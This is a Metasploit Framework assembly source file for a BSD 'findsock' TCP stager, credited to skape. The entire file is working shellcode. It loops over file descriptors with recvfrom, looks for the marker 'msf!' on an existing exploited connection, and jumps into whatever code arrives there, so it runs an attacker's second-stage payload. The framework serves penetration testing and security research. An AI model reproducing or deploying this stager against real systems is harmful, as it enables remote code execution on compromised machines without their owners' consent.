;;
; 
;        Name: stager_sock_find
;   Qualities: Nothing Special
;     Version: $Revision: 1630 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a BSD findsock TCP stager.
;
;        File descriptor in edi
;
; Meta-Information:
;
; meta-shortname=BSD FindTag Stager
; meta-description=Run a second stage from an established connection
; meta-authors=skape <mmiller [at] hick.org>
; meta-os=bsd
; meta-arch=ia32
; meta-category=stager
; meta-connection-type=findtag
; meta-name=find
; meta-basemod=Msf::PayloadComponent::FindConnection
; meta-offset-findtag=0x1b
;;
BITS   32
GLOBAL main

main:

initialize_stack:
	xor  edx, edx
	push edx
	mov  esi, esp
	push edx
	push edx
	mov  dl, 0x80
	push edx
	mov  dh, 0x0c
	push edx
	push esi
	push edx
	push edx

recvfrom:
	inc  word [esi - 0x18]
	push byte 29
	pop  eax
	int  0x80
	cmp  dword [esi], 0x2166736d
	jnz  recvfrom

%ifndef USE_SINGLE_STAGE

	cld
	lodsd
	pop  edx
%ifdef FD_REG_EBX
	pop  ebx
%else
	pop  edi
%endif
	pop  edx
	jmp  esi

%else

	pop  edx

%ifdef FD_REG_EBX
	pop  ebx
%else
	pop  edi
%endif

%endif
